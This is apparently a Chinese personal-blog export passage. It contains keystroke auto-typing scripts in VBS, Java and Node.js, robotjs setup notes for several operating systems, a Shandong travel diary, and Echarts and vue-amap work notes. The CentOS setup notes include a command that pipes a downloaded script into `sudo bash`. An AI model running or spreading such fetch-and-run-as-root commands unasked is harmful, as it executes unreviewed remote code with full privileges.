class="line">        .Type = 2    &apos;读取文本文件</span><br><span class="line">        .Mode = 3   &apos;读写</span><br><span class="line">        .Open</span><br><span class="line">        .LoadFromFile FileName</span><br><span class="line">        .Charset = &quot;UTF-8&quot;  &apos;设定编码</span><br><span class="line">        .Position = 2</span><br><span class="line">        ReadUTF = .ReadText</span><br><span class="line">        .Close</span><br><span class="line">    End With</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function delay(s%)</span><br><span class="line">    tm = Timer</span><br><span class="line">    Do Until Timer - tm &gt; s</span><br><span class="line">        DoEvents</span><br><span class="line">    Loop</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure>

<h4 id="2-Java"><a href="#2-Java" class="headerlink" title="2 Java"></a>2 Java</h4><p>果然这个才是本命，没有VBS简单，不过可以跨平台使用了（未验证）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.awt.AWTException;</span><br><span class="line">import java.awt.Robot;</span><br><span class="line">import java.awt.event.KeyEvent;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.Set;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * java打字</span><br><span class="line"> * 只支持英文和字符</span><br><span class="line"> * @author xuchl</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">public class javaTyper &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		try &#123;</span><br><span class="line"></span><br><span class="line">			// 键码对照</span><br><span class="line">			Map&lt;String, Integer&gt; keyCodeMap = new HashMap&lt;String, Integer&gt;();</span><br><span class="line">			keyCodeMap.put(&quot;~&quot;, 0xC0);</span><br><span class="line">			keyCodeMap.put(&quot;-&quot;, 0x2D);</span><br><span class="line">			keyCodeMap.put(&quot;=&quot;, 0x3D);</span><br><span class="line">			keyCodeMap.put(&quot;	&quot;, (int) &apos;\t&apos;);</span><br><span class="line">			keyCodeMap.put(&quot;[&quot;, 0x5B);</span><br><span class="line">			keyCodeMap.put(&quot;]&quot;, 0x5D);</span><br><span class="line">			keyCodeMap.put(&quot;\\&quot;, 0x5C);</span><br><span class="line">			keyCodeMap.put(&quot;;&quot;, 0x3B);</span><br><span class="line">			keyCodeMap.put(&quot;&apos;&quot;, 0xDE);</span><br><span class="line">			keyCodeMap.put(&quot;,&quot;, 0x2C);</span><br><span class="line">			keyCodeMap.put(&quot;.&quot;, 0x2E);</span><br><span class="line">			keyCodeMap.put(&quot;/&quot;, 0x2F);</span><br><span class="line">			keyCodeMap.put(&quot; &quot;, 0x20);</span><br><span class="line"></span><br><span class="line">			// Shift配合用</span><br><span class="line">			keyCodeMap.put(&quot;`&quot;, 0xC0);</span><br><span class="line">			keyCodeMap.put(&quot;!&quot;, 0x31);</span><br><span class="line">			keyCodeMap.put(&quot;@&quot;, 0x32);</span><br><span class="line">			keyCodeMap.put(&quot;#&quot;, 0x33);</span><br><span class="line">			keyCodeMap.put(&quot;$&quot;, 0x34);</span><br><span class="line">			keyCodeMap.put(&quot;%&quot;, 0x35);</span><br><span class="line">			keyCodeMap.put(&quot;^&quot;, 0x36);</span><br><span class="line">			keyCodeMap.put(&quot;&amp;&quot;, 0x37);</span><br><span class="line">			keyCodeMap.put(&quot;*&quot;, 0x38);</span><br><span class="line">			keyCodeMap.put(&quot;(&quot;, 0x39);</span><br><span class="line">			keyCodeMap.put(&quot;)&quot;, 0x30);</span><br><span class="line">			keyCodeMap.put(&quot;_&quot;, 0x2D);</span><br><span class="line">			keyCodeMap.put(&quot;+&quot;, 0x3D);</span><br><span class="line">			keyCodeMap.put(&quot;&#123;&quot;, 0x5B);</span><br><span class="line">			keyCodeMap.put(&quot;&#125;&quot;, 0x5D);</span><br><span class="line">			keyCodeMap.put(&quot;|&quot;, 0x5C);</span><br><span class="line">			keyCodeMap.put(&quot;:&quot;, 0x3B);</span><br><span class="line">			keyCodeMap.put(&quot;\&quot;&quot;, 0xDE);</span><br><span class="line">			keyCodeMap.put(&quot;&lt;&quot;, 0x2C);</span><br><span class="line">			keyCodeMap.put(&quot;&gt;&quot;, 0x2E);</span><br><span class="line">			keyCodeMap.put(&quot;?&quot;, 0x2F);</span><br><span class="line"></span><br><span class="line">			keyCodeMap.put(&quot;0&quot;, 0x30);</span><br><span class="line">			keyCodeMap.put(&quot;1&quot;, 0x31);</span><br><span class="line">			keyCodeMap.put(&quot;2&quot;, 0x32);</span><br><span class="line">			keyCodeMap.put(&quot;3&quot;, 0x33);</span><br><span class="line">			keyCodeMap.put(&quot;4&quot;, 0x34);</span><br><span class="line">			keyCodeMap.put(&quot;5&quot;, 0x35);</span><br><span class="line">			keyCodeMap.put(&quot;6&quot;, 0x36);</span><br><span class="line">			keyCodeMap.put(&quot;7&quot;, 0x37);</span><br><span class="line">			keyCodeMap.put(&quot;8&quot;, 0x38);</span><br><span class="line">			keyCodeMap.put(&quot;9&quot;, 0x39);</span><br><span class="line"></span><br><span class="line">			keyCodeMap.put(&quot;a&quot;, 0x41);</span><br><span class="line">			keyCodeMap.put(&quot;b&quot;, 0x42);</span><br><span class="line">			keyCodeMap.put(&quot;c&quot;, 0x43);</span><br><span class="line">			keyCodeMap.put(&quot;d&quot;, 0x44);</span><br><span class="line">			keyCodeMap.put(&quot;e&quot;, 0x45);</span><br><span class="line">			keyCodeMap.put(&quot;f&quot;, 0x46);</span><br><span class="line">			keyCodeMap.put(&quot;g&quot;, 0x47);</span><br><span class="line">			keyCodeMap.put(&quot;h&quot;, 0x48);</span><br><span class="line">			keyCodeMap.put(&quot;i&quot;, 0x49);</span><br><span class="line">			keyCodeMap.put(&quot;j&quot;, 0x4A);</span><br><span class="line">			keyCodeMap.put(&quot;k&quot;, 0x4B);</span><br><span class="line">			keyCodeMap.put(&quot;l&quot;, 0x4C);</span><br><span class="line">			keyCodeMap.put(&quot;m&quot;, 0x4D);</span><br><span class="line">			keyCodeMap.put(&quot;n&quot;, 0x4E);</span><br><span class="line">			keyCodeMap.put(&quot;o&quot;, 0x4F);</span><br><span class="line">			keyCodeMap.put(&quot;p&quot;, 0x50);</span><br><span class="line">			keyCodeMap.put(&quot;q&quot;, 0x51);</span><br><span class="line">			keyCodeMap.put(&quot;r&quot;, 0x52);</span><br><span class="line">			keyCodeMap.put(&quot;s&quot;, 0x53);</span><br><span class="line">			keyCodeMap.put(&quot;t&quot;, 0x54);</span><br><span class="line">			keyCodeMap.put(&quot;u&quot;, 0x55);</span><br><span class="line">			keyCodeMap.put(&quot;v&quot;, 0x56);</span><br><span class="line">			keyCodeMap.put(&quot;w&quot;, 0x57);</span><br><span class="line">			keyCodeMap.put(&quot;x&quot;, 0x58);</span><br><span class="line">			keyCodeMap.put(&quot;y&quot;, 0x59);</span><br><span class="line">			keyCodeMap.put(&quot;z&quot;, 0x5A);</span><br><span class="line"></span><br><span class="line">			Set&lt;String&gt; specialCodeSet = new HashSet&lt;String&gt;();</span><br><span class="line">			specialCodeSet.add(&quot;~&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;!&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;@&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;#&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;$&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;%&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;^&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;&amp;&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;*&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;(&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;)&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;_&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;+&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;&#123;&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;&#125;&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;|&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;:&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;\&quot;&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;&lt;&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;&gt;&quot;);</span><br><span class="line">			specialCodeSet.add(&quot;?&quot;);</span><br><span class="line"></span><br><span class="line">			// 数据来源文件</span><br><span class="line">			BufferedReader br = new BufferedReader(new FileReader(&quot;C:\\Users\\xuchl\\Desktop\\test.txt&quot;));</span><br><span class="line">			String lineStr = &quot;&quot;;</span><br><span class="line">			char c;</span><br><span class="line"></span><br><span class="line">			// JDK自带Robot类，用于为测试自动化。</span><br><span class="line">			// 能够控制鼠标和键盘，还能屏幕截图。</span><br><span class="line">			Robot r = new Robot();</span><br><span class="line">			r.delay(2000);</span><br><span class="line"></span><br><span class="line">			while ((lineStr = br.readLine()) != null) &#123;</span><br><span class="line">				for (int i = 0; i &lt; lineStr.length(); i++) &#123;</span><br><span class="line">					c = lineStr.charAt(i);</span><br><span class="line">					// 按下键盘按键</span><br><span class="line">					if (65 &lt;= c &amp;&amp; c &lt;= 90 || specialCodeSet.contains(String.valueOf(c))) &#123;</span><br><span class="line">						// 大写字母和部分特殊字符按下shift</span><br><span class="line">						r.keyPress(KeyEvent.VK_SHIFT);</span><br><span class="line">					&#125;</span><br><span class="line">					r.keyPress(keyCodeMap.get(String.valueOf(c).toLowerCase()));</span><br><span class="line"></span><br><span class="line">					// 释放键盘按键</span><br><span class="line">					if (65 &lt;= c &amp;&amp; c &lt;= 90 || specialCodeSet.contains(String.valueOf(c))) &#123;</span><br><span class="line">						r.keyRelease(KeyEvent.VK_SHIFT);</span><br><span class="line">					&#125;</span><br><span class="line">					r.keyRelease(keyCodeMap.get(String.valueOf(c).toLowerCase()));</span><br><span class="line">					// 延迟，不随机了</span><br><span class="line">					r.delay(100);</span><br><span class="line">				&#125;</span><br><span class="line">				r.keyPress(KeyEvent.VK_ENTER);</span><br><span class="line">				r.keyRelease(KeyEvent.VK_ENTER);</span><br><span class="line">			&#125;</span><br><span class="line">			br.close();</span><br><span class="line"></span><br><span class="line">		&#125; catch (FileNotFoundException fnfe) &#123;</span><br><span class="line">			fnfe.printStackTrace();</span><br><span class="line">		&#125; catch (IOException ioe) &#123;</span><br><span class="line">			ioe.printStackTrace();</span><br><span class="line">		&#125; catch (AWTException awte) &#123;</span><br><span class="line">			awte.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-Node-js"><a href="#3-Node-js" class="headerlink" title="3 Node.js"></a>3 Node.js</h4><p>有自己库的语言就是强大啊，比如Python，Go（这两个都不写了，go的go-vgo/robotgo加载不下来），用的第三方的robotjs，不同系统需要的环境不同。<br>本来很简单就写完了，但是朋友的Deepin跑出的效果和Win10不同。然后在自己的的Deepin中验证，效果一样（主要为<code>&lt;</code>和<code>“</code>的问题）。刚开始以为是Deepin自己的问题，然后又装了CentOS7（8太大，7下了第三个镜像才搞定GUI），最后效果一样，不知道是不是官方的锅。提了一个issue，还拉上一个英语老师给我看看英语写的对不对，但愿对方能看懂吧。<br>Node.js也不是很复杂，但是速度不能往小里调。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">  nodejs打字</span><br><span class="line">  只支持英文和字符</span><br><span class="line">  author xuchl</span><br><span class="line">*/</span><br><span class="line">const robot = require(&quot;robotjs&quot;);</span><br><span class="line">const fs = require(&apos;fs&apos;);</span><br><span class="line">const readline = require(&apos;readline&apos;);</span><br><span class="line"></span><br><span class="line">// 速度调低明显，把数值调大效果不大</span><br><span class="line">// 800 : Characters per minute</span><br><span class="line">//robot.typeStringDelayed(&quot;`1234567890-=[]\;&apos;,./~!@#$%^&amp;*()_+&quot;, 800);</span><br><span class="line"></span><br><span class="line">// 速度调低明显，把数值调小效果不大</span><br><span class="line">// Sets the delay in milliseconds to sleep after a keyboard event. This is 10ms by default.</span><br><span class="line">//robot.setKeyboardDelay(5);</span><br><span class="line"></span><br><span class="line">// ==========2 start==========</span><br><span class="line">// deepin,centos(Linux)中robotjs特殊字符对应(&lt;, &quot;更为特殊)</span><br><span class="line">const specialCodeAry = [&quot;~&quot;, &quot;!&quot;, &quot;@&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;^&quot;, &quot;&amp;&quot;, &quot;*&quot;, &quot;(&quot;, &quot;)&quot;, &quot;_&quot;, &quot;+&quot;, &quot;&#123;&quot;, &quot;&#125;&quot;, &quot;|&quot;, &quot;:&quot;, &quot;&gt;&quot;, &quot;?&quot;];</span><br><span class="line">// ==========2 end==========</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">	const readInterface = readline.createInterface(&#123;</span><br><span class="line">		input: fs.createReadStream(&apos;../test.txt&apos;)</span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">	readInterface.on(&apos;line&apos;, function(line) &#123;</span><br><span class="line">		for (let i = 0; i &lt; line.length; i++) &#123;</span><br><span class="line">			//robot.keyTap(line.charAt(i)); // 需要配合SHIFT的按键字符会变成不按SHIFT的状态，比如大写字母变小写，*变8</span><br><span class="line">			// ==========1 start==========</span><br><span class="line">			//robot.typeString(line.charAt(i)); // 所见即所得(windows限定,在Linux里不好使，keyTap效果一样但是大写字母与&lt;除外)</span><br><span class="line">			// ==========1 end==========</span><br><span class="line">			// ==========2 start==========</span><br><span class="line">			// deepin,centos(Linux)中robotjs特殊字符对应(&lt;, &quot;更为特殊)</span><br><span class="line">			let curChar = line.charAt(i);</span><br><span class="line">			if (curChar === &quot;\&quot;&quot;) &#123;</span><br><span class="line">				robot.keyTap(&quot;&apos;&quot;, [&quot;shift&quot;]);</span><br><span class="line">			&#125; else if (-1 &lt; specialCodeAry.indexOf(curChar)) &#123;</span><br><span class="line">				robot.keyTap(curChar, [&quot;shift&quot;]);</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				robot.typeString(curChar);</span><br><span class="line">			&#125;</span><br><span class="line">			// ==========2 end==========</span><br><span class="line">		&#125;</span><br><span class="line">		robot.keyTap(&quot;enter&quot;);</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;, 2000);</span><br></pre></td></tr></table></figure>

<blockquote>
<h4 id="我的安装过程，可以忽略"><a href="#我的安装过程，可以忽略" class="headerlink" title="我的安装过程，可以忽略"></a>我的安装过程，可以忽略</h4><p>robotjs编译环境<br><img src="/img/20200510/3.png" alt></p>
<blockquote>
<p>Win10<br>因为笔记本换成了NUC，安装时提示没有Python，装了最新的Python（但是它只支持2.7的），然后再安装又提示没有VS库。<br><img src="/img/20200510/4.png" alt><br>执行一句<code>npm install --global --production windows-build-tools</code>环境就齐了（Python2.7也装上了）</p>
</blockquote>
<blockquote>
<p>Deepin<br>因为之前搞过别的，基本环境都有。提示缺少X11/extensions/XTest.h<br>执行<code>sudo apt-get install libx11-dev</code>和<code>sudo apt-get install xorg-dev</code>后安装成功</p>
</blockquote>
<blockquote>
<p>CentOS7<br>这个就比较痛苦了，需要先装系统<br>使用官网二进制数据包安装Node.js<br><code>wget https://nodejs.org/dist/v12.16.3/node-v12.16.3-linux-x64.tar.xz</code><br><code>tar -xvf node-v12.16.3-linux-x64.tar.xz</code><br><code>ln -s /home/xuchl/桌面/node-v12.16.3-linux-x64/bin/node /usr/bin/node</code><br><code>ln -s /home/xuchl/桌面/node-v12.16.3-linux-x64/bin/npm /usr/bin/npm</code><br><code>node -v</code><br><code>npm -v</code><br>显示版本号，安装成功<br>执行<code>npm i robotjs</code>报错<br>sh: prebuild-install: 未找到命令<br>sh: node-gyp: 未找到命令<br>然后没有解决问题，明明Deepin也是这么装的<br>应该是Node.js安装问题，然后尝试使用yum安装<br><code>curl -sL https://rpm.nodesource.com/setup_10.x | sudo bash -</code><br><code>sudo yum install nodejs</code><br>执行<code>npm i robotjs</code>报错<br>make: g++：命令未找到<br>执行<code>yum install gcc-c++</code>安装<br>再安装报错：../src/mouse.c:12:35: 致命错误：X11/extensions/XTest.h：没有那个文件或目录<br>执行以下命令依旧报错<br><code>yum install libX11*</code><br><code>yum install xorg*</code><br><code>yum install libxtst*</code><br><code>yum install libpng*</code><br>然后放弃了，真香警告<br>放大招<code>yum -y upgrade</code>,此命令慎用，因为我是新环境无所谓<br>执行<code>yum install libXtst-devel</code>后安装成功<br>跑出结果已经过了晚上12点了</p>
</blockquote>
</blockquote>
<h4 id="4-没有其他了"><a href="#4-没有其他了" class="headerlink" title="4 没有其他了"></a>4 没有其他了</h4><p>本来还想用别的语言写的，只有能够调用键盘，应该都能写。除了上面写过以及提到过的语言，其他的比如C，PHP都可以实现。但是被Node.js搞的头大，就不了了之了，实现逻辑也都差不多。</p>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>VBS</tag>
        <tag>Node.js</tag>
        <tag>VBA</tag>
      </tags>
  </entry>
  <entry>
    <title>山东行-曹州古城-太白湖</title>
    <url>/2024/12/20/%E5%B1%B1%E4%B8%9C%E8%A1%8C-%E6%9B%B9%E5%B7%9E%E5%8F%A4%E5%9F%8E-%E5%A4%AA%E7%99%BD%E6%B9%96/</url>
    <content><![CDATA[<p><em>虽然第一次写游记，但是之前去过了不少地方，虽然大部分都是被动去的，估计也不会写之前的了。这次主要是去参加朋友婚礼，唯二参加的朋友婚礼，只不过上次是以伴郎的身份，于是就有了这次跨越整个山东的旅程</em></p>
<p>火车票放票当天，正好帮人送客户去蓬莱，不过到蓬莱的时候赶上了开售时间十点半。从烟台到菏泽能当天直达的火车只有两趟，其中高铁票秒没，退而求其次，朋友帮我买了十个半小时多的软卧下铺。第一次做软卧，因为是始发站加白天，人很少，路上除了刚开始走错车厢的人以及乘务员的下车提醒，基本没什么人来打扰。一个人的卧铺还是很舒服的，还有充电插头，省下了专门为此次行程准备的充电宝。想当年春节返程的车票不好抢，只能做24小时的硬座去杭州，当时年轻，现在老矣。<br><img src="/img/trails/sd_hz_jn_jn/1.jpg" alt></p>
<p>做了一天的火车，当时菏泽的天气雾霾，能见度很低。朦胧的荷泽站，第一次踏上菏泽的土地。<br><img src="/img/trails/sd_hz_jn_jn/2.jpg" alt></p>
<p>出了车站，因为只有两公里，于是步行导航去宾馆。路上还折返了一段，刚开始走在坡上，发现过不去，坡太高没法跳下走下面的涵洞。认识的朋友都还在路上，我是最先到的。晚上朋友陆续到来，基本都是几年不见，甚至大学毕业后就没见过了，十几年了。朋友凑齐，深夜一起少喝了点。天公作美，此时雾霾已经渐渐散去。晚上基本没怎么睡，手表记录的时间不到三小时。可能晚上吃的油腻的太多外加啤酒，没消化就匆匆上床了，早上反酸烧心，难受醒了，就不睡了去帮帮忙。</p>
<p>中间基本没啥插曲，挺顺利的，除了我多跑了一趟宾馆……下午两点多，婚礼结束了，打完招呼也该离开了，不知道下次和朋友们见面是何时了，毕竟不在同一个城市。收时好行囊，打车去了附近的菏泽老城，但是地图上定位是不准的，准确的说老城能看的貌似只有青年湖那一角，其他都是些商店小区啥的，而定位在最中间。在司机的指引下，步行过去，映入眼帘的是一个景区标志。<br><img src="/img/trails/sd_hz_jn_jn/3.jpg" alt></p>
<p>顺着曹州路漫步，观看沿街古风建筑牌坊。<br><img src="/img/trails/sd_hz_jn_jn/4.jpg" alt><br><img src="/img/trails/sd_hz_jn_jn/5.jpg" alt></p>
<p>拐进里面，雕梁画栋。<br><img src="/img/trails/sd_hz_jn_jn/6.jpg" alt></p>
<p>湖水，亭子，石桥，大殿，宝塔交相辉映。<br><img src="/img/trails/sd_hz_jn_jn/7.jpg" alt><br><img src="/img/trails/sd_hz_jn_jn/8.jpg" alt><br><img src="/img/trails/sd_hz_jn_jn/9.jpg" alt></p>
<p>青年湖上，十二生肖桥横跨南北。<br><img src="/img/trails/sd_hz_jn_jn/10.jpg" alt><br><img src="/img/trails/sd_hz_jn_jn/11.jpg" alt><br><img src="/img/trails/sd_hz_jn_jn/12.jpg" alt><br><img src="/img/trails/sd_hz_jn_jn/13.jpg" alt></p>
<p>基本逛了一圈就离开了，永安塔需要门票就没有上去。夜景应该比白天好看，但是没有留下来观看。还被朋友吐槽来的不是时候，不能看到菏泽牡丹。菏泽之旅就这样匆匆结束了。</p>
<p>本来打算直接去济南的，车票都买好了。但朋友在济宁，于是就退票去了济宁，欠了近10年的饭终于“蹭”回来了，手动滑稽。两人脸上也多了些岁月的痕迹。因为到达的比较晚，我们是最后一桌，奈何两人战斗力不行，饭也干不动。<br><img src="/img/trails/sd_hz_jn_jn/14.jpg" alt><br><img src="/img/trails/sd_hz_jn_jn/15.jpg" alt></p>
<p>朋友还定好了宾馆，奈何路况不熟悉，送我到宾馆的路上逆行了一段……抵达目的地后，最后在我的目光中车辆消失在视野中，下次相遇又不知是何年。这次也是第一次来济宁，第二天在朋友的建议下去看了一下4A级太白湖旅游景区，刚开始还想做公交去的，看了下时刻表放弃了，到那边的车排班太少，要等很久，于是乎就打车去了。</p>
<p>不是从正门进入太白湖旅游景区的，应该是东北门吧。漫步在柏油路，随风飘落的柳叶在诉说它的萧条。因为冬天温度不是很冷，依旧有绿色映入眼帘。<br><img src="/img/trails/sd_hz_jn_jn/16.jpg" alt></p>
<p>依旧来的时间不对，没有“接天莲叶无穷碧，映日荷花别样红”。中间小路比较难走，柳树的树根把石砖都顶起来了，有种走乡村小路的感觉。<br><img src="/img/trails/sd_hz_jn_jn/17.jpg" alt></p>
<p>路上树木色彩还是很丰富的。<br><img src="/img/trails/sd_hz_jn_jn/18.jpg" alt></p>
<p>基本就是走啊走走啊走，路上还能看见几只小鸭子，奈何消失太快。道路平稳悠长，适合来骑行和跑步。<br><img src="/img/trails/sd_hz_jn_jn/19.jpg" alt><br><img src="/img/trails/sd_hz_jn_jn/20.jpg" alt></p>
<p>走到中心位置发现因为是违建，路已经封死，就开始往正门的方向移动。</p>
<p>荷花在为明年绽放做准备。<br><img src="/img/trails/sd_hz_jn_jn/21.jpg" alt></p>
<p>远处的树上还有几只水鸟，还能听到战斗机的轰鸣，看见它的身影，不愧是双拥模范城。<br><img src="/img/trails/sd_hz_jn_jn/22.jpg" alt></p>
<p>接近大门，人文相关的景色渐渐多了起来。<br><img src="/img/trails/sd_hz_jn_jn/23.jpg" alt></p>
<p>此时枫叶还是很好看的。<br><img src="/img/trails/sd_hz_jn_jn/24.jpg" alt><br><img src="/img/trails/sd_hz_jn_jn/25.jpg" alt></p>
<p>太阳高照，阳光洒在湖面上，波光粼粼。<br><img src="/img/trails/sd_hz_jn_jn/26.jpg" alt><br><img src="/img/trails/sd_hz_jn_jn/27.jpg" alt></p>
<p>景区很大，风景很多，正门附近适合多花点时间游览。终于拍到了一只小鸭子，不过转眼间又消失了。<br><img src="/img/trails/sd_hz_jn_jn/28.jpg" alt></p>
<p>石桥，木桥伫立在水面上。<br><img src="/img/trails/sd_hz_jn_jn/29.jpg" alt></p>
<p>开始进入大门附近区域，李白的塑像开始变多。<br>任城宝鼎<br><img src="/img/trails/sd_hz_jn_jn/30.jpg" alt></p>
<p>北湖阁<br><img src="/img/trails/sd_hz_jn_jn/31.jpg" alt><br><img src="/img/trails/sd_hz_jn_jn/32.jpg" alt></p>
<p>正门观景平台<br><img src="/img/trails/sd_hz_jn_jn/33.jpg" alt></p>
<p>双拥林<br><img src="/img/trails/sd_hz_jn_jn/34.jpg" alt></p>
<p>大门外的华表<br><img src="/img/trails/sd_hz_jn_jn/35.jpg" alt></p>
<p>暴走的一天，大概只转了景区一半。虽然不是观光的最好时间，也“偷得浮生半日闲”。<br><img src="/img/trails/sd_hz_jn_jn/36.jpg" alt></p>
<p>因为去济南买不到硬座无座，只能买张硬卧上铺了。如果能联系上曲阜的朋友可能就去曲阜了，可惜没有如果。第一次做硬卧，这趟旅程，硬卧软卧都体验了，大概只有商务座没有体验过了。感觉荷泽站该扩建了，太小了，听说曲阜站很好。火车延迟了半个多小时，车站的人就挤爆了。<br><img src="/img/trails/sd_hz_jn_jn/37.jpg" alt></p>
<p>短程硬卧还不如硬座舒服，根本起不来身，不过能睡着还是很好的。<br><img src="/img/trails/sd_hz_jn_jn/38.jpg" alt></p>
<p>最后一站济南，距离上次来济南已经过去一坤年多，住了两晚，没有去玩，也没有去找朋友。工业南路基本都在修，曾经住过的城中村已经有高楼拔起。如同一个过客，挥一挥衣袖，不带走一片云彩。<br><img src="/img/trails/sd_hz_jn_jn/39.jpg" alt></p>
<p>临走再体验下济南的地铁。<br><img src="/img/trails/sd_hz_jn_jn/40.jpg" alt></p>
<p>打印了下凭证，发现退票费也能打印了，之前只能去人工排队。不过现在可以申请电子发票了，纸质凭证也许只能作为纪念了。但随着时间的流逝，墨迹会越来越浅，最后消失……<br><img src="/img/trails/sd_hz_jn_jn/41.jpg" alt></p>
<p>发现航旅纵横可以记录火车行程了。因为12306只保留一个月的数据，历史的只能成为历史。<br><img src="/img/trails/sd_hz_jn_jn/42.jpg" alt></p>
<p>飞机行程之前PRO版记录更多，现在都一样了。<br><img src="/img/trails/sd_hz_jn_jn/43.jpg" alt></p>
<p>至此，旅程结束。一个不是很喜欢旅行的人，不知该不该期待下一次旅程。</p>
]]></content>
      <tags>
        <tag>游记</tag>
      </tags>
  </entry>
  <entry>
    <title>工作笔记-Echarts多X轴标签柱状图</title>
    <url>/2020/06/01/%E5%B7%A5%E4%BD%9C%E7%AC%94%E8%AE%B0-Echarts%E5%A4%9AX%E6%88%96Y%E8%BD%B4%E6%A0%87%E7%AD%BE%E6%9F%B1%E7%8A%B6%E5%9B%BE/</url>
    <content><![CDATA[<h2 id="工作笔记-Echarts多X或Y轴标签柱状图"><a href="#工作笔记-Echarts多X或Y轴标签柱状图" class="headerlink" title="工作笔记-Echarts多X或Y轴标签柱状图"></a>工作笔记-Echarts多X或Y轴标签柱状图</h2><p><em>虽然不是第一次写比较复杂的Echarts，记录一下，以备后用</em></p>
<h3 id="参考源"><a href="#参考源" class="headerlink" title="参考源"></a>参考源</h3><p><a href="https://gallery.echartsjs.com/editor.html?c=xBk7TY_hWx" target="_blank" rel="noopener">Simulate Hierarchy Axis</a><br>有三列，最后一列数据必须要平分，不然行对不齐。</p>
<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p><a href="https://gallery.echartsjs.com/editor.html?c=xQPnOKwjkx" target="_blank" rel="noopener">Simulate Hierarchy Axis改</a><br>主要增加了了一个markPoint来表示数量，因为参考的例子中第三列标签为label。<br>实际开发主要是对数据的操作，具体看业务逻辑了。我写的数据逻辑操作如下<br><img src="/img/20200601/1.png" alt><br>项目最后演示的demo如下<br><img src="/img/20200601/2.png" alt></p>
<p>最后吐槽一下IOS，Echarts渲染的Canvas高度超过4300左右就不显示了。IOS使用谷歌浏览器效果一样，MacOS、Android能够显示，但是数据过多会导致Android浏览器崩溃（还是我手机该换了）。</p>
]]></content>
      <tags>
        <tag>Echarts</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>工作笔记-Vue.js使用高德地图jsAPI计算两点间距离</title>
    <url>/2020/06/01/%E5%B7%A5%E4%BD%9C%E7%AC%94%E8%AE%B0-Vue-js%E4%BD%BF%E7%94%A8%E9%AB%98%E5%BE%B7%E5%9C%B0%E5%9B%BEjsAPI%E8%AE%A1%E7%AE%97%E4%B8%A4%E7%82%B9%E9%97%B4%E8%B7%9D%E7%A6%BB/</url>
    <content><![CDATA[<h2 id="工作笔记-Vue-js使用高德地图jsAPI计算两点间距离"><a href="#工作笔记-Vue-js使用高德地图jsAPI计算两点间距离" class="headerlink" title="工作笔记-Vue.js使用高德地图jsAPI计算两点间距离"></a>工作笔记-Vue.js使用高德地图jsAPI计算两点间距离</h2><p><em>只是在Vue里用到，主要还是高德地图jsAPI的逻辑，记录一下，以备后用</em></p>
<h2 id="vue-amap"><a href="#vue-amap" class="headerlink" title="vue-amap"></a>vue-amap</h2><p><a href="https://elemefe.github.io/vue-amap/" target="_blank" rel="noopener">vue-amap</a>基于 Vue 2.x 和高德地图的地图组件。Vue不是很熟悉，从文档中复制粘贴，这里只提一下。</p>
<p>npm安装<code>npm install vue-amap --save</code></p>
<p>引入vue-amap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Vue from &apos;vue&apos;;</span><br><span class="line">import VueAMap from &apos;vue-amap&apos;;</span><br><span class="line">Vue.use(VueAMap);</span><br><span class="line">VueAMap.initAMapApiLoader(&#123;</span><br><span class="line">  key: &quot;你的高德地图key&quot;,</span><br><span class="line">  plugin: [</span><br><span class="line">    &quot;Autocomplete&quot;,</span><br><span class="line">    &quot;PlaceSearch&quot;,</span><br><span class="line">    &quot;Scale&quot;,</span><br><span class="line">    &quot;OverView&quot;,</span><br><span class="line">    &quot;ToolBar&quot;,</span><br><span class="line">    &quot;MapType&quot;,</span><br><span class="line">    &quot;PolyEditor&quot;,</span><br><span class="line">    &quot;AMap.CircleEditor&quot;</span><br><span class="line">  ],</span><br><span class="line">  // 默认高德 sdk 版本为 1.4.4</span><br><span class="line">  v: &quot;1.4.4&quot;</span><br><span class="line">&#125;);</span><br><span class="line">data() &#123;</span><br><span class="line">  return &#123;</span><br><span class="line">    // 地图</span><br><span class="line">    zoom: 12,</span><br><span class="line">    center: [117.055185, 36.684594],</span><br><span class="line">    amapManager,</span><br><span class="line">    events: &#123;</span><br><span class="line">      // o下面js中替换成map了</span><br><span class="line">      init(o) &#123;……&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用</p>
